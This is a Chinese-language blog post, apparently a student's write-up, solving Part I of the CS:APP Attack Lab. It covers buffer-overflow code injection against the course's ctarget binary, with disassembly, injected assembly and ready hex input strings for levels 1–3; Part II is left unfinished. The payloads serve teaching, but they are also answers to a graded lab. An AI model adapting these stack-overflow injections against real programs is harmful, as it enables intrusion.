@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html>
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>CSAPP: Attack Lab - 辰洋的博客</title>
+  <!-- Begin Jekyll SEO tag v2.3.0 -->
+<meta property="og:title" content="CSAPP: Attack Lab">
+<meta property="og:locale" content="en_US">
+<meta name="description" content="Attack Lab是CS:APP一书中第三个实验，包括Part I和Part II两部分，分别实现Code Injection Attacks和Return-Oriented Programming。Code Injection Attacks主要利用缓冲区溢出执行不安全的代码片段；当栈被标记为nonexecutable或者位置随机时，可以利用Return-Oriented Programming达到攻击的目的。">
+<meta property="og:description" content="Attack Lab是CS:APP一书中第三个实验，包括Part I和Part II两部分，分别实现Code Injection Attacks和Return-Oriented Programming。Code Injection Attacks主要利用缓冲区溢出执行不安全的代码片段；当栈被标记为nonexecutable或者位置随机时，可以利用Return-Oriented Programming达到攻击的目的。">
+<link rel="canonical" href="http://localhost:4000/2017/CSAPP-Attack-Lab/">
+<meta property="og:url" content="http://localhost:4000/2017/CSAPP-Attack-Lab/">
+<meta property="og:site_name" content="辰洋的博客">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2017-05-07T06:38:55+08:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:site" content="@">
+<meta property="article:publisher" content="1234">
+<meta property="fb:app_id" content="1234">
+<script type="application/ld+json">
+{"name":null,"description":"Attack Lab是CS:APP一书中第三个实验，包括Part I和Part II两部分，分别实现Code Injection Attacks和Return-Oriented Programming。Code Injection Attacks主要利用缓冲区溢出执行不安全的代码片段；当栈被标记为nonexecutable或者位置随机时，可以利用Return-Oriented Programming达到攻击的目的。","author":null,"@type":"BlogPosting","url":"http://localhost:4000/2017/CSAPP-Attack-Lab/","publisher":null,"image":null,"headline":"CSAPP: Attack Lab","dateModified":"2017-05-07T06:38:55+08:00","datePublished":"2017-05-07T06:38:55+08:00","sameAs":null,"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2017/CSAPP-Attack-Lab/"},"@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+  
+  <link rel="alternate" type="application/rss+xml" title="辰洋的博客" href="http://localhost:4000/feed.xml">
+  <link rel="stylesheet" href="/assets/css/nangka.css">
+
+  
+
+</head>
+
+  <body>
+    <header class="site-header">
+    <div class="wrapper">
+        <a href="#" class="menu-icon">
+            <svg viewbox="0 0 18 15">
+                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"></path>
+                <path d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"></path>
+                <path d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"></path>
+            </svg>
+        </a>
+        <a class="site-title" href="/">辰洋的博客</a>
+        <nav class="site-nav">
+            <div class="trigger">
+            
+                
+            
+                
+                        <a class="page-link" href="/about/">About</a>
+                
+            
+                
+                        <a class="page-link" href="/archive/">Archive</a>
+                
+            
+                
+                        <a class="page-link" href="/darktime/">DarkTime</a>
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+            </div>
+        </nav>
+    </div>
+</header>
+
+    <div class="page-content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">CSAPP: Attack Lab</h1>
+    <p class="post-meta">
+       <time datetime="2017-05-07T06:38:55+08:00" itemprop="datePublished">
+          May 6, 2017
+       </time>
+       
+        <!-- | <span class="time">
+            5
+          </span>
+           Minute Read -->
+    </p>
+  </header>
+  <div class="post-content" itemprop="articleBody">
+    <p><code class="highlighter-rouge">Attack Lab</code>是<code class="highlighter-rouge">CS:APP</code>一书中第三个<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">实验</a>，包括<code class="highlighter-rouge">Part I</code>和<code class="highlighter-rouge">Part II</code>两部分，分别实现<code class="highlighter-rouge">Code Injection Attacks</code>和<code class="highlighter-rouge">Return-Oriented Programming</code>。<code class="highlighter-rouge">Code Injection Attacks</code>主要利用缓冲区溢出执行不安全的代码片段；当栈被标记为<code class="highlighter-rouge">nonexecutable</code>或者位置随机时，可以利用<code class="highlighter-rouge">Return-Oriented Programming</code>达到攻击的目的。</p>
+
+<!--more-->
+
+<p>目前的进度是完成了<code class="highlighter-rouge">Part I</code>，等有时间再回来完成<code class="highlighter-rouge">Part II</code>。</p>
+
+<h2 id="part-i-code-injection-attacks">Part I: Code Injection Attacks</h2>
+
+<h3 id="level-1">Level 1</h3>
+
+<p><code class="highlighter-rouge">Level 1</code>利用输入字符串使当前执行的代码段跳转到预设的代码片段，不会涉及到<code class="highlighter-rouge">code injection</code>：当<code class="highlighter-rouge">test()</code>中<code class="highlighter-rouge">getbuf()</code>返回后，我们要改变<code class="highlighter-rouge">test()</code>正常的执行逻辑，不再执行下一条指令，而是让<code class="highlighter-rouge">test()</code>跳转至<code class="highlighter-rouge">touch1()</code>执行指令。 <code class="highlighter-rouge">test()</code>以及<code class="highlighter-rouge">touch1()</code>对应的代码如下所示。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">test</span><span class="p">()</span> 
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">val</span><span class="p">;</span>
+    <span class="n">val</span> <span class="o">=</span> <span class="n">getbuf</span><span class="p">();</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"No exploit. Getbuf returned 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">touch1</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">vlevel</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="o">/</span> <span class="o">*</span> <span class="n">Part</span> <span class="n">of</span> <span class="n">validation</span> <span class="n">protocol</span> <span class="o">*</span> <span class="o">/</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Touch1!: You called touch1()</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">validate</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>要实现<code class="highlighter-rouge">Level 1</code>中的跳转，关键是利用缓冲区溢出来修改<code class="highlighter-rouge">test()</code>调用<code class="highlighter-rouge">getbuf()</code>时栈帧中的返回地址。使用<code class="highlighter-rouge">objdump</code>将<code class="highlighter-rouge">ctarget</code>反编译，提取<code class="highlighter-rouge">getbuf()</code>关联的的汇编代码，如下所示。</p>
+
+<pre><code class="language-assembly">00000000004017a8 &lt;getbuf&gt;:
+  4017a8:       48 83 ec 28             sub    $0x28,%rsp
+  4017ac:       48 89 e7                mov    %rsp,%rdi
+  4017af:       e8 8c 02 00 00          callq  401a40 &lt;Gets&gt;
+  4017b4:       b8 01 00 00 00          mov    $0x1,%eax
+  4017b9:       48 83 c4 28             add    $0x28,%rsp
+  4017bd:       c3                      retq
+  4017be:       90                      nop
+  4017bf:       90                      nop
+</code></pre>
+
+<p>注意到<code class="highlighter-rouge">%rsp</code>被减小了<code class="highlighter-rouge">$0x28</code>即<code class="highlighter-rouge">40</code>字节，这意味着<code class="highlighter-rouge">getbuf()</code>开辟了<code class="highlighter-rouge">40</code>字节的缓冲区，而缓冲区以上的<code class="highlighter-rouge">4</code>字节则是<code class="highlighter-rouge">getbuf()</code>执行<code class="highlighter-rouge">ret</code>指令后<code class="highlighter-rouge">test()</code>继续执行的指令的地址。<code class="highlighter-rouge">Level 1</code>要做的就是利用缓冲区溢出，修改这<code class="highlighter-rouge">4</code>字节的值，使之等于<code class="highlighter-rouge">touch1()</code>的地址。根据反编译<code class="highlighter-rouge">ctarget</code>得到的汇编代码，<code class="highlighter-rouge">touch1()</code>的起始地址为<code class="highlighter-rouge">0x4017c0</code>，如下所示。</p>
+
+<pre><code class="language-assembly">00000000004017c0 &lt;touch1&gt;:
+  4017c0:       48 83 ec 08             sub    $0x8,%rsp
+  4017c4:       c7 05 0e 2d 20 00 01    movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;
+  ...
+</code></pre>
+
+<p>综上，<code class="highlighter-rouge">Level 1</code>所需的输入字符串长度为<code class="highlighter-rouge">44</code>字节，前<code class="highlighter-rouge">40</code>字节用于填充缓冲区，具体的值不重要，后<code class="highlighter-rouge">4</code>字节等于<code class="highlighter-rouge">touch1()</code>的地址值<code class="highlighter-rouge">0x4017c0</code>，注意内存存储规则为<code class="highlighter-rouge">Little Endian</code>。</p>
+
+<div class="language-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00
+</code></pre></div></div>
+
+<p>我们利用<code class="highlighter-rouge">hex2raw</code>将输入字符串(<code class="highlighter-rouge">level1.txt</code>)转化为字节码，并将字节码文件(<code class="highlighter-rouge">level1_bc.txt</code>)作为<code class="highlighter-rouge">ctarget</code>的输入，如下图所示。</p>
+
+<p><img src="/img/img-2017-05-06-Image%201.png" alt=""></p>
+
+<p><code class="highlighter-rouge">Level 1</code>通过缓冲区溢出帮助我们理解函数与函数之间跳转的原理，但是并未涉及到参数的传递，这需要通过<code class="highlighter-rouge">code injection</code>来实现。</p>
+
+<h3 id="level-2">Level 2</h3>
+
+<p><code class="highlighter-rouge">Level 2</code>的流程与<code class="highlighter-rouge">Level 1</code>相似：<code class="highlighter-rouge">test()</code>调用<code class="highlighter-rouge">getbuf()</code>，当<code class="highlighter-rouge">getbuf()</code>返回之后，开始执行<code class="highlighter-rouge">touch2()</code>的指令。<code class="highlighter-rouge">touch2()</code>有着如下的代码逻辑。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">touch2</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">val</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">vlevel</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span> <span class="o">/</span> <span class="o">*</span> <span class="n">Part</span> <span class="n">of</span> <span class="n">validation</span> <span class="n">protocol</span> <span class="o">*</span> <span class="o">/</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">val</span> <span class="o">==</span> <span class="n">cookie</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Touch2!: You called touch2(0x%.8x)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+        <span class="n">validate</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Misfire: You called touch2(0x%.8x)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+        <span class="n">fail</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>与<code class="highlighter-rouge">Level 1</code>不同，<code class="highlighter-rouge">Level 2</code>除了需要实现指令跳转，还需要将<code class="highlighter-rouge">cookie</code>作为参数传递至<code class="highlighter-rouge">touch2()</code>。这意味着需要执行一段我们自定义的代码来实现参数的传递，这就是所谓的<code class="highlighter-rouge">code injection</code>。</p>
+
+<p>在<code class="highlighter-rouge">Level 1</code>中，我们通过改写返回地址值达到跳转至<code class="highlighter-rouge">touch1()</code>的目的，如果我们现在也仅仅是将返回地址修改为<code class="highlighter-rouge">touch2()</code>的地址，那么参数传递的问题并没有解决。根据<code class="highlighter-rouge">x86-64</code>寄存器使用规范，<code class="highlighter-rouge">touch2()</code>的参数<code class="highlighter-rouge">val</code>存储于寄存器<code class="highlighter-rouge">%rdi</code>，此时<code class="highlighter-rouge">%rdi</code>的值并不是我们期望的<code class="highlighter-rouge">cookie</code>值。如果在跳转至<code class="highlighter-rouge">touch2()</code>执行指令之前，先跳转到某个区域执行一段代码，这段代码能够设置寄存器<code class="highlighter-rouge">%rdi</code>的值，然后再跳转到<code class="highlighter-rouge">touch2()</code>执行，就可以达到我们的目的。关键是这段代码存储于内存的哪块区域？答案是由<code class="highlighter-rouge">getbuf()</code>开辟的缓冲区，也就是<code class="highlighter-rouge">Level 1</code>中可以是任意值的<code class="highlighter-rouge">40</code>字节。基于以上思路，我们需要明确缓冲区的地址以及待注入的代码。</p>
+
+<p><code class="highlighter-rouge">getbuf()</code>调用<code class="highlighter-rouge">Gets()</code>函数开辟缓冲区，而<code class="highlighter-rouge">Gets()</code>的返回值即是缓冲区的地址，根据<code class="highlighter-rouge">x86-64</code>寄存器使用规范，返回值存储于寄存器<code class="highlighter-rouge">%rax</code>。利用<code class="highlighter-rouge">gdb</code>查看寄存器<code class="highlighter-rouge">%rax</code>的值，如下图所示，缓冲区的起始地址为<code class="highlighter-rouge">0x5561dc78</code>。</p>
+
+<p><img src="/img/img-2017-05-06-Image%202.png" alt=""></p>
+
+<p>待注入的代码设置寄存器<code class="highlighter-rouge">%rdi</code>的值等于<code class="highlighter-rouge">cookie</code>值，然后跳转至<code class="highlighter-rouge">touch2()</code>执行指令。用汇编代码来描述，如下所示。</p>
+
+<pre><code class="language-assembly">mov $0x59b997fa,%rdi
+pushq $0x4017ec
+ret
+</code></pre>
+
+<p>将以上汇编代码进行汇编，然后进行反编译得到机器代码，如下图所示。</p>
+
+<p><img src="/img/img-2017-05-06-Image%203.png" alt=""></p>
+
+<p>至此，可以写出<code class="highlighter-rouge">Level 2</code>所需的输入字符串，如下所示。</p>
+
+<div class="language-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code>48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55
+</code></pre></div></div>
+
+<p>利用<code class="highlighter-rouge">hex2raw</code>将输入字符串转化为字节码，并将字节码文件作为<code class="highlighter-rouge">ctarget</code>的输入，运行结果如下图所示。</p>
+
+<p><img src="/img/img-2017-05-06-Image%204.png" alt=""></p>
+
+<h3 id="level-3">Level 3</h3>
+
+<p><code class="highlighter-rouge">Level 3</code>也需要通过<code class="highlighter-rouge">code injection</code>来传递参数。比<code class="highlighter-rouge">Level 2</code>更复杂的是，<code class="highlighter-rouge">Level 3</code>传递的参数类型是字符串，更确切的说，应该是字符串的地址。与<code class="highlighter-rouge">Level 3</code>相关联的<code class="highlighter-rouge">touch3()</code>如下所示。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">touch3</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">sval</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">vlevel</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span> <span class="o">/</span> <span class="o">*</span> <span class="n">Part</span> <span class="n">of</span> <span class="n">validation</span> <span class="n">protocol</span> <span class="o">*</span> <span class="o">/</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">hexmatch</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">sval</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Touch3!: You called touch3(</span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">sval</span><span class="p">);</span>
+        <span class="n">validate</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Misfire: You called touch3(</span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">sval</span><span class="p">);</span>
+        <span class="n">fail</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>注意到<code class="highlighter-rouge">touch3()</code>内部调用了<code class="highlighter-rouge">hexmatch()</code>，其代码如下所示。同时，根据<code class="highlighter-rouge">hexmatch()</code>的代码逻辑我们推断出<code class="highlighter-rouge">touch3()</code>期待的参数为<code class="highlighter-rouge">cookie</code>值的字符串表示。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">/</span> <span class="o">*</span> <span class="n">Compare</span> <span class="n">string</span> <span class="n">to</span> <span class="n">hex</span> <span class="n">represention</span> <span class="n">of</span> <span class="kt">unsigned</span> <span class="n">value</span> <span class="o">*</span> <span class="o">/</span>
+<span class="kt">int</span> <span class="n">hexmatch</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">val</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">sval</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">cbuf</span><span class="p">[</span><span class="mi">110</span><span class="p">];</span>
+    <span class="o">/</span> <span class="o">*</span> <span class="n">Make</span> <span class="n">position</span> <span class="n">of</span> <span class="n">check</span> <span class="n">string</span> <span class="n">unpredictable</span> <span class="o">*</span> <span class="o">/</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="n">cbuf</span> <span class="o">+</span> <span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">100</span><span class="p">;</span>
+    <span class="n">sprintf</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"%.8x"</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">strncmp</span><span class="p">(</span><span class="n">sval</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>与<code class="highlighter-rouge">Level 2</code>的思路类似，<code class="highlighter-rouge">Level 3</code>通过向<code class="highlighter-rouge">getbuf()</code>开辟的缓冲区中注入代码来达到设置参数值的目的，但是我们发现<code class="highlighter-rouge">touch3()</code>调用了<code class="highlighter-rouge">hexmatch()</code>，<code class="highlighter-rouge">hexmatch()</code>又调用了<code class="highlighter-rouge">strncmp()</code>，这就出现了问题：函数的调用会导致新的数据被<code class="highlighter-rouge">push</code>到栈中，这意味着栈中原有的数据会被覆盖。那么，我们传递的参数，也就是字符串，应该存储在内存的什么位置？</p>
+
+<p>基于以上分析，<code class="highlighter-rouge">Level 3</code>中待注入的代码与<code class="highlighter-rouge">Level 2</code>非常类似，唯一不同的就是<code class="highlighter-rouge">Level 2</code>向寄存器<code class="highlighter-rouge">%rdi</code>存储的是<code class="highlighter-rouge">cookie</code>值，而<code class="highlighter-rouge">Level 3</code>向寄存器<code class="highlighter-rouge">%rdi</code>存储的是<code class="highlighter-rouge">cookie</code>字符串的地址值。我们借助<code class="highlighter-rouge">gdb</code>对比<code class="highlighter-rouge">touch3()</code>调用<code class="highlighter-rouge">hexmatch()</code>前后缓冲区的变化情况，以此定位安全的存储字符串的地址。为此，我们先通过<code class="highlighter-rouge">Level 1</code>中的方法进入<code class="highlighter-rouge">touch3()</code>，并将指令执行至<code class="highlighter-rouge">hexmatch()</code>前一条的指令，如下图所示。</p>
+
+<p><img src="/img/img-2017-05-06-Image%205.png" alt=""></p>
+
+<p>接着执行<code class="highlighter-rouge">callq 0x40184c &lt;hexmatch&gt;</code>指令，对比执行前后缓冲区内容的变化，可以发现缓冲区的	前<code class="highlighter-rouge">40</code>个字节并没有连续的<code class="highlighter-rouge">8</code>个安全的字节供<code class="highlighter-rouge">cookie</code>字符串存储，但是从<code class="highlighter-rouge">0x5561dca0</code>开始的<code class="highlighter-rouge">40</code>个字节在<code class="highlighter-rouge">hexmatch()</code>调用前后并没有发生变化。因此，可以把字符串存储在缓冲区以外的这片内存区域中(我选择以<code class="highlighter-rouge">0x5561dca8</code>为首地址的<code class="highlighter-rouge">8</code>个字节)。</p>
+
+<p>现在可以将已确定的字符串地址存储至寄存器<code class="highlighter-rouge">%rdi</code>，对应的汇编代码如下所示，获取对应机器码的方式与<code class="highlighter-rouge">Level 2</code>一致。</p>
+
+<pre><code class="language-assembly">mov $0x5561dca8,%rdi
+pushq $0x4018fa
+ret
+</code></pre>
+
+<p>同时，<code class="highlighter-rouge">Level 3</code>的输入字符串需要根据字符串的存储地址做相应的补充，由于字符串的首地址为<code class="highlighter-rouge">0x5561dca8</code>，且字符串长度为<code class="highlighter-rouge">8</code>，因此输入字符串的总长度为<code class="highlighter-rouge">56</code>字节，如下所示。</p>
+
+<div class="language-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code>48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61
+</code></pre></div></div>
+
+<p>借助<code class="highlighter-rouge">hex2raw</code>将输入字符串转化为字节码，并将其作为<code class="highlighter-rouge">ctarget</code>的输入，结果如下图所示。</p>
+
+<p><img src="/img/img-2017-05-06-Image%206.png" alt=""></p>
+
+<h2 id="part-ii-return-oriented-programming">Part II: Return-Oriented Programming</h2>
+
+<h3 id="-todo">// TODO</h3>
+
+  </div>
+  <footer class="post-footer">
+
+    <!-- Social Share Button-->
+    <!-- <ul class="sharebutton">
+      <li class="share">Share :</li>
+      <li class="fb">
+        <a href="#" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),'facebook-share-dialog','width=626,height=436');return false;">Facebook</a>
+      </li>
+      <li class="linkedin">
+        <a href="http://www.linkedin.com/cws/share?url=http://localhost:4000/2017/CSAPP-Attack-Lab/" onclick="window.open(this.href,&quot;popupwindow&quot;,&quot;status=0,height=500,width=700,resizable=0,top=50,left=100&quot;);return false;" target="_blank" title="Share on Linkedin">Linkedin</a>
+      </li>
+      <li class="twitter">
+        <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/2017/CSAPP-Attack-Lab/ - CSAPP: Attack Lab by @" target="_blank" title="Share to Twitter">Twitter</a>
+      </li>
+      <li class="gplus">
+        <a href="https://plus.google.com/share?url=http://localhost:4000/2017/CSAPP-Attack-Lab/" onclick="window.open(this.href,&quot;popupwindow&quot;,&quot;status=0,height=500,width=700,resizable=0,top=50,left=100&quot;);return false;" target="_blank" title="Share on Google Plus">Google+</a>
+      </li>
+      <li class="pinterest">
+        <a href="http://pinterest.com/pin/create/link/?url=http://localhost:4000/2017/CSAPP-Attack-Lab/" target="_blank" title="Share to Pinterest">Pinterest</a>
+      </li>
+    </ul> -->
+
+    <!-- Post Navigation -->
+    <div class="post-navigation">
+      <a class="prev" href="/2017/6-824-Lab-1-MapReduce/">← Previous Post</a>
+      <a class="next" href="/2017/%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%88%86%E5%B8%83%E5%BC%8FRPC%E6%A1%86%E6%9E%B6/">Next Post →</a>
+    </div>
+      
+
+  </footer>
+</article>
+
+      </div>
+    </div>
+    <footer class="site-footer">
+  <div class="wrapper">
+      <div class="copy">
+          2017 © 辰洋的博客
+      </div>
+  </div>
+</footer>
+
+    <script type="text/javascript" src="/assets/js/jquery-1.11.2.min.js"></script>
+
+<script type="text/javascript" src="/assets/js/scripts.js"></script>
+
+  </body>
+</html>
